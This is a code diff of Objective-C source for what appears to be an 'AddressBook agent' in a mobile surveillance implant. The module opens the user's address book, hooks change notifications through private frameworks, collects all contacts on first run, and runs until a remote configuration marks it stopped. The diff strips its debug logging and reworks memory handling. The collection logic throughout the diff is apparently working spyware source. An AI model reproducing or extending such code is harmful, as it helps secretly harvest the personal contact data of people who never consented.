@@ -627,19 +627,15 @@ typedef struct _ABLogStrcut {
 
 - (void)start
 {
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  
   id                messageRawData;
   ABAddressBookRef  addressBook;
   NSTimeInterval    waitSec = WAIT_TIME;
-  
-  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-   
+    
   messageRawData = [mAgentConfiguration objectForKey: @"data"];
   [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];  
-  
-#ifdef DEBUG
-  NSLog(@"Agent AddressBook started");
-#endif 
-  
+
   // Get property
   [self _getAgentABProperty];
   
@@ -648,34 +644,18 @@ typedef struct _ABLogStrcut {
   
   if (addressBook == NULL) 
     {
-#ifdef DEBUG
-      NSLog(@"Agent AddressBook cannot open mobile user addressbook");
-#endif
       return;
     }
   
   // add the callback for messages (privateFrameworks): registered on main thread runloop!
   ABAddressBookRegisterExternalChangeCallback(addressBook, ABNotificationCallback, (void *) self);
   
-#ifdef DEBUG
-  NSLog(@"start: AddressBook agent setting callback on context 0x%X on callback 0x%x (mLastABDateTime = %lu)", 
-        self, (void *) ABNotificationCallback, mLastABDateTime);
-#endif
-  
   // running for the very first time (mLastABDateTime = 0)
   if(mLastABDateTime == ALL_ADDRESS)
     {
-#ifdef DEBUG
-      NSLog(@"start: AddressBook run filter collector %ld", mLastABDateTime);
-#endif
-      [self _getAddressBook: addressBook withDateTime: ALL_ADDRESS];
+       [self _getAddressBook: addressBook withDateTime: ALL_ADDRESS];
     }
-  else 
-    {
-#ifdef DEBUG
-      NSLog(@"start: AddressBook not run filter collector %ld", mLastABDateTime);
-#endif
-    }
+
 
   NSPort *aPort = [NSPort port];
   [[NSRunLoop currentRunLoop] addPort: aPort 
@@ -703,9 +683,6 @@ typedef struct _ABLogStrcut {
           // Check for agent stopped
           if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
             {
-#ifdef DEBUG
-              NSLog(@"start: AddressBook Agent stop notification received");
-#endif
               break;
             }
           [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow: RL_TIME]];
@@ -721,12 +698,14 @@ typedef struct _ABLogStrcut {
   if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
   {
     // Agent Calendar set the status to STOPPED
-#ifdef JSON_CONFIG
     [mAgentConfiguration setObject: AGENT_STOPPED
                             forKey: @"status"];
-#endif
     gAgentStopped = TRUE;
   }
+  
+  [mAgentConfiguration release];
+  mAgentConfiguration = nil;
+  
   [outerPool release];
 }
 
@@ -761,20 +740,6 @@ typedef struct _ABLogStrcut {
 - (BOOL)resume
 {
   return YES;
-}
-
-- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
-{
-  if (aConfiguration != mAgentConfiguration)
-    {
-      [mAgentConfiguration release];
-      mAgentConfiguration = [aConfiguration retain];
-    }
-}
-
-- (NSMutableDictionary *)mAgentConfiguration
-{
-  return mAgentConfiguration;
 }
 
 @end
